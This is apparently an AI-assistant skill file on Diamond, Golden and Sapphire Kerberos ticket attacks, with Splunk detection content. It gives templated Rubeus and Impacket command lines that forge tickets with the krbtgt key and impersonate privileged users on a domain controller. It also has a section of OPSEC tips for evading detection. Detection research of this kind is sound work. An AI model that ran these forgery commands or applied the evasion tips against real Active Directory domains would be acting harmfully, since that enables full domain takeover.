---
name: diamond-ticket
description: Security research skill for understanding Diamond Ticket Kerberos attacks. Use this skill whenever the user asks about Kerberos ticket manipulation, diamond tickets, golden tickets, sapphire tickets, TGT forgery, PAC modification, Rubeus diamond commands, Impacket ticketer, or Kerberos attack detection. Also trigger for questions about AS-REQ/AS-REP flows, krbtgt hash usage, or Event ID 4768/4769/4624 analysis. Make sure to use this skill for any Kerberos security research, red team methodology, or detection engineering questions.
---

# Diamond Ticket Security Research

A skill for understanding and researching Diamond Ticket Kerberos attack techniques for security research, detection engineering, and defensive analysis.

## What is a Diamond Ticket?

A **diamond ticket** is a modified legitimate TGT (Ticket Granting Ticket) that can access any service as any user. Unlike golden tickets (forged offline), diamond tickets are created by:

1. Requesting a legitimate TGT from the domain controller
2. Decrypting it with the domain's krbtgt hash
3. Modifying PAC attributes (user, groups, SIDs, logon info)
4. Re-encrypting with the same krbtgt key

This overcomes golden ticket detection because:
- TGS-REQs have a preceding AS-REQ (normal flow)
- The TGT has correct domain policy details from the DC

## Requirements

| Component | Purpose |
|-----------|----------|
| **krbtgt AES256 key** (preferred) or NTLM hash | Decrypt and re-sign the TGT |
| **Legitimate TGT blob** | Base ticket to modify (via `/tgtdeleg`, `asktgt`, `s4u`, or memory export) |
| **Context data** | Target user RID, group RIDs/SIDs, LDAP-derived PAC attributes |
| **Service keys** (optional) | AES key of service SPN for service ticket recutting |

## Core Workflow

```
1. Obtain TGT for controlled user via AS-REQ
   └─ Rubeus /tgtdeleg coerces client to perform Kerberos GSS-API without credentials

2. Decrypt TGT with krbtgt key
   └─ Extract PAC structure and attributes

3. Patch PAC attributes
   └─ User, groups, logon info, SIDs, device claims

4. Re-encrypt with krbtgt key
   └─ Sign the modified ticket

5. Inject into logon session
   └─ kerberos::ptt, Rubeus.exe ptt
```

## Rubeus Diamond Commands

### Basic Diamond TGT

```powershell
./Rubeus.exe diamond /tgtdeleg \
  /ticketuser:<target_username> \
  /ticketuserid:<target_rid> \
  /groups:<comma_separated_rids> \
  /krbkey:<KRBTGT_AES256_KEY> \
  /ldap /ldapuser:<domain>\\<user> /ldappassword:<password> \
  /opsec /nowrap
```

**Parameters:**
- `/tgtdeleg` - Returns decryptable TGT without victim credentials
- `/ldap` - Queries AD and SYSVOL for real PAC context (GptTmpl.inf, account attributes)
- `/opsec` - Windows-like AS-REQ retry, AES-only, realistic KDCOptions
- `/nowrap` - Output raw ticket (no base64 wrapping)

### Service Ticket Recutting

```powershell
./Rubeus.exe diamond \
  /ticket:<BASE64_TGT_OR_KRB_CRED> \
  /service:<SPN> \
  /servicekey:<AES256_SERVICE_KEY> \
  /ticketuser:<target_username> \
  /ticketuserid:<target_rid> \
  /ldap /opsec /nowrap
```

Use when you control a service account key and want to mint realistic TGS without KDC traffic.

### Impacket Sapphire Variant

```bash
python3 ticketer.py -request -impersonate '<privileged_user>' \
  -domain '<domain>' -user '<lowpriv_user>' -password '<password>' \
  -aesKey '<krbtgt_aes256>' -domain-sid '<domain_sid>'

export KRB5CCNAME=lowpriv.ccache
python3 psexec.py <domain>/<user>@<dc> -k -no-pass
```

**Sapphire technique:** Combines Diamond's real TGT base with S4U2self+U2U to steal a privileged PAC and splice it into your TGT.

## Detection & OPSEC

### What Defenders Look For

| Indicator | Golden Ticket | Diamond Ticket | Sapphire |
|-----------|---------------|----------------|----------|
| TGS-REQ without AS-REQ | ✓ Common | ✗ Has AS-REQ | ✗ Has AS-REQ |
| Decade-long lifetimes | ✓ Common | ✗ Policy-compliant | ✗ Policy-compliant |
| Missing PAC fields | ✓ Common | ✗ Full PAC | ✗ Full PAC |
| `ENC-TKT-IN-SKEY` | ✗ | ✗ | ✓ U2U fingerprint |
| `additional-tickets` | ✗ | ✗ | ✓ U2U fingerprint |
| `sname` = requester | ✗ | ✗ | ✓ Self-service pattern |

### OPSEC Best Practices

1. **Populate all PAC fields** - Logon hours, user profile paths, device IDs. Automated comparisons flag incomplete PACs.

2. **Don't oversubscribe groups** - If you need Domain Admins (512) and Enterprise Admins (519), stop there. Excessive `ExtraSids` is a giveaway.

3. **Match domain policy** - Use `/ldap` to extract `GptTmpl.inf` and Kerberos policy. Wrong lifetimes or etypes stand out.

4. **Enforce AES-only** - Microsoft is phasing out RC4 (CVE-2026-20833). Mixing RC4 into forged PACs will increasingly trigger alerts.

5. **Correlate Event IDs** - Diamond tickets surface when PAC content looks impossible. Look for:
   - Event 4768 (AS-REQ) followed by 4769 (TGS-REQ)
   - Event 4624 logon with unusual group membership
   - Paired 4768/4769 with same client but different CNAMES (Sapphire)

### Detection Engineering

**Splunk Security Content** provides attack-range telemetry for diamond tickets. Key detections:

- **Windows Domain Admin Impersonation Indicator** - Correlates unusual 4768/4769/4624 sequences and PAC group changes
- **T1558.001** - Steal or Manipulate Kerberos Ticket

**Query pattern:**
```splunk
index=windows EventCode=4768 
| join EventID with EventCode=4769 
| join EventID with EventCode=4624 
| where User_Name != Target_User_Name 
| where Group_Membership contains "Domain Admins"
```

## References

- [Palo Alto Unit 42 – Precious Gemstones: The New Generation of Kerberos Attacks (2022)](https://unit42.paloaltonetworks.com/next-gen-kerberos-attacks/)
- [Core Security – Impacket: We Love Playing Tickets (2023)](https://www.coresecurity.com/core-labs/articles/impacket-we-love-playing-tickets)
- [Huntress – Recutting the Kerberos Diamond Ticket (2025)](https://www.huntress.com/blog/recutting-the-kerberos-diamond-ticket)
- [Splunk Security Content – Diamond Ticket attack data & detections (2023)](https://research.splunk.com/attack_data/be469518-9d2d-4ebb-b839-12683cd18a7c/)
- [Microsoft – RC4 service ticket enforcement for CVE-2026-20833](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

## When to Use This Skill

Use this skill when:
- Researching Kerberos attack techniques for security testing
- Building detection rules for diamond/golden/sapphire tickets
- Understanding AS-REQ/AS-REP/TGS-REQ flows
- Analyzing Event ID 4768/4769/4624 for anomalies
- Studying PAC structure and modification
- Learning about Rubeus or Impacket ticket tools
- Designing red team exercises involving Kerberos
- Creating SOC detection content for T1558.001

## Common Questions

**Q: Diamond vs Golden ticket?**
A: Golden = forged offline from scratch. Diamond = modified legitimate TGT. Diamond is stealthier because it has proper AS-REQ flow and domain policy compliance.

**Q: What's the krbtgt hash?**
A: The AES256 or NTLM hash of the KRBTGT account. This is the domain's Kerberos signing key. Compromise = full domain control.

**Q: How do I get a TGT blob?**
A: Rubeus `/tgtdeleg` (no victim creds needed), `asktgt` (requires creds), or export from memory (Mimikatz `kerberos::list` + `kerberos::ptt`).

**Q: What is PAC?**
A: Privilege Attribute Certificate. Contains user/group SIDs, logon info, device claims. The "identity baggage" attached to Kerberos tickets.

**Q: Sapphire vs Diamond?**
A: Sapphire uses S4U2self+U2U to steal a privileged PAC from another user and splice it into your TGT. Diamond modifies your own TGT's PAC directly.

**Q: Detection priority?**
A: Focus on PAC content anomalies, not just ticket lifetimes. Diamond tickets look legitimate on surface; the forgery shows in impossible group memberships or missing PAC fields.
